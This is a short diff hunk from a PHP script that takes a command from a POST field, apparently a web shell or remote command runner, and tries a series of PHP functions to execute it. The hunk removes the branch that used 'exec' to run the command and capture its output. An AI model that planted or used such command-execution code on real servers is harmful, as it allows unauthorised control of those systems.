@@ -79,12 +79,7 @@ if (isset( $_POST['command'])):
 			ob_end_clean();
 		}
 	
-		// Try: exec
-		else if(function_exists('exec'))
-		{
-			exec($command , $output , $return_var);
-			$output = implode("" , $output);
-		}
+
 		// No function exists
 		else
 		{
